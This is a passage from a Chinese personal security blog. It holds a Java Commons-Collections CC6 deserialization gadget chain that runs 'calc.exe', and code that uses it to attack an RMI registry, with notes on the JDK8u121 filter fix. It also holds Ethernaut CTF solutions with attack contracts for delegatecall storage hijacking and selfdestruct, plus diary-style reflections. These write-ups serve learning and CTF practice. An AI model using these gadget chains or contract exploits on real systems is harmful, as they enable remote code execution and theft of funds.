class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, </span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;Runtime.class, <span class="literal">null</span>&#125;</span><br><span class="line">            ),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                    <span class="string">&quot;exec&quot;</span>, </span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, </span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;</span><br><span class="line">            )</span><br><span class="line">    &#125;;</span><br><span class="line">		</span><br><span class="line">    <span class="comment">// put fake transformers</span></span><br><span class="line">    <span class="comment">// use reflection instead of &quot;put&quot; method to avoid unexpected serialization</span></span><br><span class="line">    Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">    <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line"></span><br><span class="line">    <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">    <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    expMap.put(tiedMapEntry, <span class="string">&quot;any&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// remove the pair &quot;&#x27;test&#x27;:1&quot; inserted by LazyMap#get()</span></span><br><span class="line">    outerMap.remove(<span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// use reflection to put real transformer in</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">    f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    f.set(transformerChain, transformers);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> expMap;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>唯一需要注意的点是，中间 <code>remove</code> 去除了 <code>LazyMap</code> 在第一次 <code>expMap.put()</code> 时触发 <code>tiedMapEntry.hashcode()</code> 进而触发 <code>tiedMapEntry.getValue()</code> 进而触发 <code>map.get()</code> 时被 <code>LazyMap</code> 特性插入的值；</p>
<p><code>LazyMap</code> 的特点是 <code>get</code> 不存在的值会触发 <code>transformer</code>，然后返回并插入 <code>transformer</code> 的返回值，必须要移除掉这个值，靶机真正反序列化 payload 的时候才能再次调用恶意的 transformer；</p>
<p>理解了这一点，基本就理解了 CC6；</p>
<h3 id="Registry-Attack"><a href="#Registry-Attack" class="headerlink" title="Registry Attack"></a>Registry Attack</h3><p>先把 SDK 改成 <code>JDK8u20</code>；</p>
<p>已知 <code>registry.rebind()</code>，<code>registry.bind()</code>，<code>registry.lookup()</code> 过程都会触发反序列化，以从 Server 端 <code>registry.rebind()</code> 打 Register 端为例，其传递的对象参数必须实现 <code>Remote</code> 接口，通过动态代理 <code>InvocationHandler</code> 的方式可以给 payload 包装一层 <code>Remote</code> 接口；</p>
<p>选用 <code>AnnotationInvocationHandler</code> 是因为其可以包含一个任意 <code>Map</code> 对象的序列化数据，很好用，因此与 CC1 被修复了无关，只要有反序列化 <code>AnnotationInvocationHandler</code> 的条件，这个包装方式其实是可以长足利用的；</p>
<p>进行代理之后辅以强转即可：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Constructor</span> <span class="variable">aihConstructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).</span><br><span class="line">	getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">aihConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) aihConstructor.newInstance(Override.class, getEvilClass());</span><br><span class="line"><span class="type">Remote</span> <span class="variable">remote</span> <span class="operator">=</span> (Remote) Proxy.newProxyInstance(RMIServer.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Remote.class&#125;, handler);</span><br></pre></td></tr></table></figure>

<p>完整代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">OBJECT_URL</span> <span class="operator">=</span> <span class="string">&quot;rmi://localhost:1099/Hello&quot;</span>;</span><br><span class="line">    <span class="comment">//    private static final String CODEBASE_URL = &quot;http://127.0.0.1:9999/&quot;;</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">POLICY_FILE</span> <span class="operator">=</span> <span class="string">&quot;rmi.policy&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">SERVER_START_MESSAGE</span> <span class="operator">=</span> <span class="string">&quot;SERVER STARTED&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">REGISTRY_IP</span> <span class="operator">=</span> <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">REGISTRY_PORT</span> <span class="operator">=</span> <span class="number">1099</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// start server</span></span><br><span class="line">        <span class="comment">// System.setProperty(&quot;java.rmi.server.codebase&quot;, CODEBASE_URL);</span></span><br><span class="line">        System.setProperty(<span class="string">&quot;java.security.policy&quot;</span>, RMIServer.class.getClassLoader().</span><br><span class="line">                getResource(POLICY_FILE).toString());</span><br><span class="line">        LocateRegistry.createRegistry(REGISTRY_PORT);</span><br><span class="line">        <span class="type">RMIClass</span> <span class="variable">remoteObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMIClassImpl</span>();</span><br><span class="line">        Naming.bind(OBJECT_URL, remoteObject);</span><br><span class="line">        System.out.println(SERVER_START_MESSAGE);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// attack registry by CC6</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(REGISTRY_IP, REGISTRY_PORT);</span><br><span class="line">        <span class="comment">// use any serializable InvocationHandler to do proxy</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">aihConstructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).</span><br><span class="line">                getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        aihConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) aihConstructor.newInstance(Override.class, getEvilClass());</span><br><span class="line">        <span class="type">Remote</span> <span class="variable">remote</span> <span class="operator">=</span> (Remote) Proxy.newProxyInstance(</span><br><span class="line">                RMIServer.class.getClassLoader(),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Remote.class&#125;,</span><br><span class="line">                handler);</span><br><span class="line">        registry.rebind(<span class="string">&quot;QST&quot;</span>, remote);</span><br><span class="line">        <span class="comment">// registry.bind(&quot;QST&quot;, remote);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getEvilClass</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">		<span class="comment">// CC6 payload generation</span></span><br><span class="line">        <span class="keyword">return</span> expMap;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="fix-in-jdk8u121"><a href="#fix-in-jdk8u121" class="headerlink" title="fix in jdk8u121"></a>fix in jdk8u121</h4><p>白名单 <code>ObjectInputFilter</code> 机制加入，RMI Registry 首当其冲，新增的 <code>RegistryImpl#registryFilter</code>  使用讨厌的白名单机制过滤反序列化数据的属性：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> String.class != var2 &amp;&amp; </span><br><span class="line">    !Number.class.isAssignableFrom(var2) &amp;&amp; </span><br><span class="line">        !Remote.class.isAssignableFrom(var2) &amp;&amp; </span><br><span class="line">            !Proxy.class.isAssignableFrom(var2) &amp;&amp; </span><br><span class="line">                !UnicastRef.class.isAssignableFrom(var2) &amp;&amp; </span><br><span class="line">                    !RMIClientSocketFactory.class.isAssignableFrom(var2) </span><br><span class="line">                        &amp;&amp; !RMIServerSocketFactory.class.isAssignableFrom(var2) &amp;&amp; </span><br><span class="line">                            !ActivationID.class.isAssignableFrom(var2) &amp;&amp; </span><br><span class="line">                                !UID.class.isAssignableFrom(var2) </span><br><span class="line">                                    ? Status.REJECTED : Status.ALLOWED;</span><br></pre></td></tr></table></figure>

<p>下断点动调一下，发现 <code>ObjectInputFilter</code> 对类的检查是递归的，如 <code>AnnotationInvocationHandle</code> 这些内部类会被检查出来 <code>REJECTED</code> 掉；</p>
<p>如何用有限的类去构造 gadget 就成了问题，先写到这；</p>
<h2 id="总会"><a href="#总会" class="headerlink" title="总会"></a>总会</h2><p>粘腻的青春已然板结了他的土壤，播种下再多的种子，他的青春也只是一场空，而非能够在未来的某一天发芽了；</p>
<p>好想再来一次，虽然总会成为老师的。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://qst137.github.io/2024/09/15/2024-09-15-%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%82%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="QST137">
      <meta itemprop="description" content="苍山岁岁有人去，唯愿洱海生白波。">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="QST2's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/09/15/2024-09-15-%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%82%86/" class="post-title-link" itemprop="url">区块链学习之肆</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-09-15 00:00:00" itemprop="dateCreated datePublished" datetime="2024-09-15T00:00:00+08:00">2024-09-15</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-09-19 21:18:03" itemprop="dateModified" datetime="2024-09-19T21:18:03+08:00">2024-09-19</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="区块链学习之肆"><a href="#区块链学习之肆" class="headerlink" title="区块链学习之肆"></a>区块链学习之肆</h1><p>老想学币了，可是币太贵了；</p>
<h2 id="ethernaut-Preservation"><a href="#ethernaut-Preservation" class="headerlink" title="ethernaut - Preservation"></a>ethernaut - Preservation</h2><p><strong>description</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// This contract utilizes a library to store two different times for two different timezones. The constructor creates two instances of the library for each time to be stored.</span><br><span class="line"></span><br><span class="line">// The goal of this level is for you to claim ownership of the instance you are given.</span><br><span class="line"></span><br><span class="line">  // Things that might help</span><br><span class="line"></span><br><span class="line">// Look into Solidity&#x27;s documentation on the delegatecall low level function, how it works, how it can be used to delegate operations to on-chain. libraries, and what implications it has on execution scope.</span><br><span class="line">// Understanding what it means for delegatecall to be context-preserving.</span><br><span class="line">// Understanding how storage variables are stored and accessed.</span><br><span class="line">// Understanding how casting works between different data types.</span><br></pre></td></tr></table></figure>

<p><strong>source</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Preservation &#123;</span><br><span class="line">    // public library contracts</span><br><span class="line">    address public timeZone1Library;</span><br><span class="line">    address public timeZone2Library;</span><br><span class="line">    address public owner;</span><br><span class="line">    uint256 storedTime;</span><br><span class="line">    // Sets the function signature for delegatecall</span><br><span class="line">    bytes4 constant setTimeSignature = bytes4(keccak256(&quot;setTime(uint256)&quot;));</span><br><span class="line"></span><br><span class="line">    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) &#123;</span><br><span class="line">        timeZone1Library = _timeZone1LibraryAddress;</span><br><span class="line">        timeZone2Library = _timeZone2LibraryAddress;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // set the time for timezone 1</span><br><span class="line">    function setFirstTime(uint256 _timeStamp) public &#123;</span><br><span class="line">        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // set the time for timezone 2</span><br><span class="line">    function setSecondTime(uint256 _timeStamp) public &#123;</span><br><span class="line">        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Simple library contract to set the time</span><br><span class="line">contract LibraryContract &#123;</span><br><span class="line">    // stores a timestamp</span><br><span class="line">    uint256 storedTime;</span><br><span class="line"></span><br><span class="line">    function setTime(uint256 _time) public &#123;</span><br><span class="line">        storedTime = _time;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析源码，<code>Preservation</code> 定义了两个成员合约，可以存储时间，然后定义两个函数，通过 <code>delegatecall()</code> 调用 <code>setTime()</code>；</p>
<p><code>delegatecall()</code> 的特点在这，在执行目标函数的时候，并不改变执行的上下文，本意是提供调用库函数的功能，但自然也能修改原合约的成员变量；</p>
<p>但如何污染库？其实这个合约函数本身写的是有问题的，<code>storedTime = _time;</code> 这个赋值操作在原文的上下文中并不能找到 <code>uint256 storedTime</code>，而是将在 <code>delegatecall()</code> 的上下文中与 <code>LibraryContract</code> 中 <code>uint256 storedTime</code> 对应的 <code>Storage</code> 槽的对应位置的存储赋为目标值，这是 <code>delegatecall()</code> 的特性；</p>
<p><code>timeZone1Library</code> 的 <code>uint256 storedTime</code> 位于第 1 个槽（填满），对应 <code>Preservation</code> 的 <code>address public timeZone1Library</code> ;</p>
<p>故而解题思路是，部署一个能修改 <code>owner</code> 的恶意合约，然后以上述原理将 <code>timeZone1Library</code> 用 <code>timeZone2Library.setTime()</code> 污染为恶意合约地址，再调用 <code>timeZone1Library.setTime()</code> 即可；</p>
<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p><strong>attack contract</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract PreservationAttack&#123;</span><br><span class="line">    address public timeZone1Library;</span><br><span class="line">    address public timeZone2Library;</span><br><span class="line">    address public owner;</span><br><span class="line">    function setTime(uint256) public &#123;</span><br><span class="line">        owner = tx.origin;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>得到恶意合约 <code>0x72872ddD9571727C9F8Fe91Cb6023deFCCF8a423</code>；</p>
<p><strong>payload</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// pollute timeZone1Library </span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">setSecondTime</span>(<span class="string">&#x27;0x72872ddD9571727C9F8Fe91Cb6023deFCCF8a423&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// delecatecall attack contract</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">setFirstTime</span>(<span class="string">&#x27;0x0&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>成功；</p>
<h2 id="ethernaut-Preservation-1"><a href="#ethernaut-Preservation-1" class="headerlink" title="ethernaut - Preservation"></a>ethernaut - Preservation</h2><p><strong>description</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// A contract creator has built a very simple token factory contract. Anyone can create new tokens with ease. After deploying the first token contract, the creator sent 0.001 ether to obtain more tokens. They have since lost the contract address.</span><br><span class="line"></span><br><span class="line">// This level will be completed if you can recover (or remove) the 0.001 ether from the lost contract address.</span><br></pre></td></tr></table></figure>

<p><strong>source</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Recovery &#123;</span><br><span class="line">    //generate tokens</span><br><span class="line">    function generateToken(string memory _name, uint256 _initialSupply) public &#123;</span><br><span class="line">        new SimpleToken(_name, msg.sender, _initialSupply);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SimpleToken &#123;</span><br><span class="line">    string public name;</span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    // constructor</span><br><span class="line">    constructor(string memory _name, address _creator, uint256 _initialSupply) &#123;</span><br><span class="line">        name = _name;</span><br><span class="line">        balances[_creator] = _initialSupply;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // collect ether in return for tokens</span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        balances[msg.sender] = msg.value * 10;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // allow transfers of tokens</span><br><span class="line">    function transfer(address _to, uint256 _amount) public &#123;</span><br><span class="line">        require(balances[msg.sender] &gt;= _amount);</span><br><span class="line">        balances[msg.sender] = balances[msg.sender] - _amount;</span><br><span class="line">        balances[_to] = _amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // clean up after ourselves</span><br><span class="line">    function destroy(address payable _to) public &#123;</span><br><span class="line">        selfdestruct(_to);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第一次 <code>generateToken()</code> 生成的 <code>SimpleToken</code> 合约地址丢失了，现在要想办法恢复向原 <code>SimpleToken</code> 发送的<code>0,001 Ether</code>；</p>
<p>区块链上的动作都是透明的，故而用 <a target="_blank" rel="noopener" href="https://sepolia.etherscan.io/">Etherscan</a> 查询 <code>instance</code> 合约的交易记录：</p>
<p><img src="https://i.imgur.com/trllu38.png"></p>
<p>发现创建合约，点进去查看余额和目标 <code>SimpleToken</code> 的地址：</p>
<p><img src="https://i.imgur.com/yzoFDx4.png"></p>
<p>找到了丢失的合约地址，又因为合约具有 <code>destroy</code> 函数，调用即可；</p>
<h3 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h3><p><strong>attack contract</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract RecoveryAttack &#123;</span><br><span class="line">    event log(bool);</span><br><span class="line">    event log(string);</span><br><span class="line"></span><br><span class="line">    constructor(address _victim) &#123;</span><br><span class="line">        (bool is_success,) = _victim.call(abi.encodeWithSignature(&quot;destroy(address)&quot;, payable(tx.origin)));</span><br><span class="line">        emit log(is_success);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>exploit 最短的一集，重点还是区块链上函数调用记录的透明性；</p>
<h2 id="庆祝生活回到正轨且正轨变宽"><a href="#庆祝生活回到正轨且正轨变宽" class="headerlink" title="庆祝生活回到正轨且正轨变宽"></a>庆祝生活回到正轨且正轨变宽</h2><p>想起来我删了很久的一条：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 那就让我们来比一比，看看谁活得更精彩。</span></span><br></pre></td></tr></table></figure>

<p>输了我就躺下，不过好像一直在赢，多久会输呢，敢不敢输呢；</p>
<p>没想过，我相信不是不敢想，而只是被蒙蔽住了，或者占用掉了。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://qst137.github.io/2024/09/15/2024-09-15-%E4%B8%A4%E5%B9%B4%E4%B8%8A%E4%B8%8B/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="QST137">
      <meta itemprop="description" content="苍山岁岁有人去，唯愿洱海生白波。">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="QST2's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/09/15/2024-09-15-%E4%B8%A4%E5%B9%B4%E4%B8%8A%E4%B8%8B/" class="post-title-link" itemprop="url">两年上下</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2024-09-15 00:00:00 / Modified: 04:25:56" itemprop="dateCreated datePublished" datetime="2024-09-15T00:00:00+08:00">2024-09-15</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/misc/" itemprop="url" rel="index"><span itemprop="name">misc</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="两载上下"><a href="#两载上下" class="headerlink" title="两载上下"></a>两载上下</h1><h2 id="两载上非下"><a href="#两载上非下" class="headerlink" title="两载上非下"></a>两载上非下</h2><p>长城杯前几天刚跟人吵了架，口嗨恶心到人家，我又叛逆症发作，给人家考研哥挤兑退群了；</p>
<p>我肯定不想的，他很好的一个人，但我也没道理嘴上让步，我确实没错，让步我也不爽了，我压力也大啊！</p>
<p>我一直不相信”道不同不相为谋“这句话，我认为人生很大程度是因为”道不同相为谋“这种事情的存在变得精彩刺激起来的；</p>
<p>可是我在接纳别人的时候却又不循循善诱别人接纳自己，这就是我的不对了；</p>
<h2 id="两载上与下"><a href="#两载上与下" class="headerlink" title="两载上与下"></a>两载上与下</h2><p>啊操，这何尝不是一种摆烂呢，突然想起 22.09 的自己，像一条已经失去了生的希望的死鱼，讨厌的人在抢救我，回去问问它，能不能拔掉我的氧气管呢；</p>
<p>事实上是我进化成新的生命了，似乎是很恶心的生命，但我身上像卸下了几万斤的担子，想必外表看起来很丑陋，因为试图抢救我把我变回活鱼的它瞠目结舌；</p>
<p>两栖动物在鱼眼里想必是丑陋，手脚好怪，鱼为什么不能永远圆圆的呢，长出手脚有什么用呢？掰到了怎么办呢？掰疼了怎么办呢？掰断了怎么办呢？没有手脚，还会游泳吗？</p>
<h2 id="两载上或下"><a href="#两载上或下" class="headerlink" title="两载上或下"></a>两载上或下</h2><p>挨骂具体日期不记得了，大概是最近，懒得重新去翻，不能反反复复捡骂；</p>
<p>青春留给我的两项作品赛，目前已经完成的很好，可能也有了点挑衅的资本；</p>
<p>时至今日，再去骂我的老朋友们应该也不再是因为心虚了，却再没了半分雅致，这是非常反常的一件事；</p>
<p>也不知在这漫漫短夜的一个角落，是否还有一个悲喜都像是带着哭腔的声音，仍孜孜不倦地暗咒着我的龌龊与冰冷。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
